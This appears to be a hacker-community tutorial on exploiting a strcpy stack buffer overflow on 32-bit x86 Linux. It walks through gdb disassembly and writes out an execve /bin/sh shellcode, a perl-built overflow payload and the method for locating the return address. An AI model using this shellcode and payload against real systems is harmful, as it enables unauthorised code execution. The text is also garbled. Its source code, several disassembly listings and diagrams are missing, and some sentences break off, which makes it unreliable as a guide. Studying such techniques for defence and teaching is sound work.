---------[ 0x130 - Introduction to Gotfault Sharing Knowledge (GSK) ]
 
GSK was created to interested users on programming security to discuss 
about exploitation techniques under stuff of the selected subject.
The main goal consists on users to share knowledge with each one.
I'll try to pass detailed informations of the selected subject, giving
the chance to users that are just starting. All kind of users are welcome.

 
---------[ 0x140 - Introduction to Buffer Overflow ]
 
The principle of exploiting a buffer overflow is to overwrite parts of
memory which aren't supposed to be overwritten by arbitrary input and
making the process execute this code. To see how and where an overflow
takes place, lets take a look at how memory is organized.
 
 
---------[ 0x150 - Memory Sections ]
 
The processes memory consists of three sections:
 
 - Code segment:  Data, in this segment, are assembler instructions that
                  the processor executes. The code execution is non-linear,
                  it can skip code, jump, and call functions on certain
                  conditions. Therefore, we have a pointer called EIP, or
                  instruction pointer. The address where EIP points to 
                  always contains the code that will be executed next.
 
 - Data segment:  Space for variables and static/dynamic buffers.
 
 - Stack segment: Which is used to pass data(arguments) to functions
                  and as a space for variables of functions. The bottom(start)
                  of the stack usually resides at the very end of the virtual
                  memory of a page, and grows down. The assembler command PUSHL
                  will add to the top of the stack, and POPL will remove one item
                  from the top of the stack and put it in a register.

---------[ 0x160 - Function Calls Process (FCP) ]
 
On a Unix system, a function call may be broken up in three steps:
 
 - Prolog   : The current frame pointer(EBP register) is saved. A frame can be viewed
              as a logical unit of the stack, and contains all the elements
              related to a function. The amount of memory which is necessary
              for the function is reserved.
 
 - Call     : The function parameters are stored in the stack and the instruction 
              pointer(EIP register) is saved, in order to know which instruction must be 
              considered when the function returns.
 
 - Epilog   : The old stack state is restored(Return).
 
 
---------[ 0x170 - Main Registers of the Stack ]
 
The following registers are important in operation of the stack:
 
 EIP - The extended instruction pointer. When you call a function, this
       pointer is saved on the stack for later use. When the function returns,
       this saved address is used to determine the location of the next executed
       instruction.
 
 ESP - The extended stack pointer. This points to the current position
       on the stack and allows things to be added to and removed from the
       stack using push and pop operations or direct stack pointer manipulations.
 
 EBP - The extended base pointer. This register usually stays the same
       throughout the execution of a function. It serves as a static point for
       referencing stack-based information such as variables and data in a
       function using offsets. This pointer usually points to the top of the stack
       for a function.
 
 
---------[ 0x180 - Introduction to the Stack Frame ]
 
A stack frame is the name given the entire stack section used by a given function,
including all the passed arguments, the saved EIP and potentially any other saved
registers as EBP, and the local function variables. Previously we focused on the
stack.s use in holding local variables; now we will go into the *bigger picture*
of the stack.
 
To understand how the stack works in the real, we need some understanding
of the Intel CALL and RET instructions.
 
The CALL instruction makes functions possible. The purpose of this instruction 
is to divert processor control to a different part of code while remembering 
where you need to return. To get this goal, a CALL instruction operates like this:
 
 -  Push address of the next instruction after the call onto the stack. (This
    is where the processor will return to after executing the function)
 -  Jump to the address specified by the call.
 
The RET instruction does the opposite. Its purpose is to return from a
called function to whatever was right after the CALL instruction. The RET
instruction operates like this:
 
 - Pop the stored return address off the stack.
 - Jump to the address popped off the stack.
 
This combination allows code to be jumped to and returned from very
easily, without restricting the nesting of function calls too much.

We'll now check this source code following all flow of memory to demostrate
what happen with registers and stack area. After all we'll be able to exploit 
and execute any code.
 
Let's see instructions inside main function with gdb.

End of assembler dump.

I'll explain now what happen with each line.
 
0x080483e9 <main+0>:    push   %ebp
0x080483ea <main+1>:    mov    %esp,%ebp
0x080483ec <main+3>:    sub    $0x8,%esp
 
It's a PROLOG.
First, EIP is saved from the function _init (or _start), that initialize 
this program, which called main().
Old frame pointer is saved(%ebp) and does, from current stack pointer(esp),
the new frame pointer(mov %esp, %ebp).
After gcc-2.9.6 dummy bytes is always set free at functions, in this case 
0x08 bytes.
It's the default process that any function does. 
 
Process Layout at this moment looks like:
 
      |-------------------| --------------------------------+
      | saved EIP         | - from caller(_start) of main() |
      |-------------------|                                 |

0x080483f9 <main+16>:   mov    0xc(%ebp),%eax
0x080483fc <main+19>:   add    $0x4,%eax
0x080483ff <main+22>:   mov    (%eax),%eax
0x08048401 <main+24>:   mov    %eax,(%esp)
0x08048404 <main+27>:   call   0x80483c4 <bof>
 
At line main+16, 0xc(%ebp) is moved to EAX register.
This address is vector from argv.
At line main+19, is argv[1] set at EAX register.
At line main+22, argv[1] as pointer, it gets what argv[1] is pointing to.
At line main+24, all content of argv[1] is being moved to stack pointer(%esp).
At line main+27, bof function call is done. Its parameters are piled 
(in reverse order) and the function is invoked.
 
Process Layout at this moment looks like:
 
      |-------------------| --------------------------------+
      | saved EIP         | - from caller(_start) of main() |
      |-------------------|                                 |

0x08048415 <main+44>:   mov    $0x1,%eax
 
Well, at line main+32, address(0x8048534) of string "Not gonna do it!\n" is 
moved to stack pointer(%esp) and then printf(), at line main+39, is called 
with his argument passed. The instruction mov $0x1, %eax is for return 1.
 
Process Layout at this moment looks like:
 
      |-------------------| --------------------------------+
      | saved EIP         | - from caller(_start) of main() |
      |-------------------|                                 |
      | saved EBP         | - from caller(_start) of main() |

      |-------------------| 
 
0x0804841a <main+49>:   leave
0x0804841b <main+50>:   ret

It's a Epilog.
At line main+49, is the leave instruction that does:
 
mov %ebp, %esp <- restores EBP(old frame from _start function).
pop %ebp       <- take off EBP from ESP(old frame) and loads at %ebp (EBP saved at main). 
 
At line main+50, RET instruction gets what %esp is pointing to and loads, at EIP
register, this pointed address, so, this address will be executed.
 
Process Layout at this moment looks like:

Now, let's see instructions inside bof function with GDB.
 
(gdb) disassemble bof

0x080483c7 <bof+3>:     sub    $0x118,%esp
 
It's a Prolog. 
Again, first, EIP is saved from the main function, that call bof function.
Old frame pointer is saved(%ebp) and does, from current stack pointer(ESP),
the new frame pointer(mov %esp, %ebp).
0x118 bytes are available for local variable buffer.
 
Process Layout at this moment looks like:

0x080483dd <bof+25>:    call   0x80482e8 <_init+72>
 
Function strcpy requires two arguments, the first one is buffer to alocate the second
argument, in this case argv[1]. So, at line bof+9 0x8(%ebp)(argv[1]) is moved to EAX
and at line bof+12, EAX is moved to 0x4(%esp). After, LEA instruction is activated.
LEA does: loads the efective address from 0xfffffef8(%ebp) to EAX. The difference
of LEA to MOV is that LEA loads address from somewhere to some register and MOV copies
the content of address from somewhere to some register.

0x080483e7 <bof+35>:    leave
0x080483e8 <bof+36>:    ret
 
It's a Epilog.
Again, at line bof+35, is the LEAVE instruction that does:
 
mov %ebp, %esp <- restores EBP(old frame from main function).
pop %ebp       <- take off EBP from ESP(old frame) and loads at %ebp (EBP saved at bof). 
 
At line bof+36, RET instruction gets what %esp is pointing to and loads, at EIP
register, this pointed address, so, this address will be executed when returns
to main fucntion and will follow the normal flow even main finishs.
 
Process Layout at this moment looks like:

At bof function we can see a problem with strcpy function.
The function strcpy() does not check its boundaries, that means
that it does not check if argv[1] fits into buffer, and just keeps
on copying into buffer until it encounters a NULL string (\0).

EIP controlled means that we can now jump to anywhere or execute any instruction

to there to execute /bin/sh. Let's restart the process at GDB.

First, we've break at call of bof function just to debug.
I've also set one display to watch EIP as ASM Instruction format and
after we continue to leave the break. Getting informations about main registers
we can see that EBP and EIP were controlled by us. Our code to execute will be 
called by shellcode. But try to figure out, to overwrite EIP we filled the buffer
with 272 bytes. So our malicious buffer will looks like:
 
[################] + [SHELLCODE] + [CCCC] = 272 bytes.

[SHELLCODE]        = Code to execute /bin/sh
[CCCC]             = Bytes to overwrite EIP
------------------ = 272 bytes.
 
We'll use this follow shellcode:
 
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
"\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
 
This shellcode have 24 bytes and executes /bin/sh.
 
[################] = Garbage                  - 244 bytes
[SHELLCODE]        = Code to execute /bin/sh  -  24 bytes
[CCCC]             = Bytes to overwrite EIP   -   4 bytes
------------------ = 272 bytes.
 
Now we'll back to GDB and build our malicious buffer.
 
(gdb) run `perl -e 'print "A"x244,"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53
\x89\xe1\x99\xb0\x0b\xcd\x80","CCCC" '`

(gdb) c

(gdb) i r eip
eip            0x43434343       0x43434343
(gdb)
 
As we can see, theory works and EIP still controlled by us.
Well, the 4 bytes to control EIP must be replaced by the address of shellcode at ESP.
After replaced "CCCC" by the address of shellcode (as we said before, will points 
to the next instruction), shellcode will be executed. All processs looks like:
 
                           +-------------+ 
                           |             |
                           v             |
[################] + [SHELLCODE] + [&SHELLCODE] = 272 bytes.
                                      (EIP)
 
To get address of this shellcode at stack memory we can do a direct jump
to begin of shellcode instructions or use NOP bytes.
 
For direct jump method we need to check where shellcode instructions starts at stack
memory. Let's see:
 
(gdb) x/128xb $esp
          .
          .
          .
0xbffffc48:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffffc50:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffffc58:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffffc60:     0x41    0x41    0x41    0x41    0x31    0xc0    0x50    0x68
0xbffffc68:     0x2f    0x2f    0x73    0x68    0x68    0x2f    0x62    0x69
0xbffffc70:     0x6e    0x89    0xe3    0x50    0x53    0x89    0xe1    0x99
0xbffffc78:     0xb0    0x0b    0xcd    0x80    0x43    0x43    0x43    0x43
 
We can see part of our A's and following the shellcode and to finishs "CCCC".
So, shellcode address is at 0xbffffc64.
Now we need to add this address inside of our malicious buffer, in little endian 
format, and re-execute the program.
 
Backing to GDB again.

The NOP idea is simple. A NOP is an instruction that does nothing. 
It only takes up space. (Incidentally, the NOP was originally created 
for debugging.) Since the NOP is only a single byte long, it is immune 
to the problems of byte ordering and alignment issues.
The trick involves filling our buffer with NOPs before the actual payload. If
we incorrectly guess the address of the payload, it will not matter, as long as we
guess an address that points somewhere in a NOP sled. Since the entire buffer is
full of NOPs, we can guess any address that lands in the buffer. Once we land
on a NOP, we will begin executing each NOP. We slide forward over all the
NOPs until we reach our actual payload. The larger the buffer of NOPs, the less
precise we need to be when guessing the address of our payload. Let's see:

---------[ 0x1b0 - Conclusion ]
 
I've described the most known and basic stack overflow module. Different methods
can be used if the buffer isn't big enough for the shellcode or if some Stack
protections are installed. Coming soon theses methods will be described also.
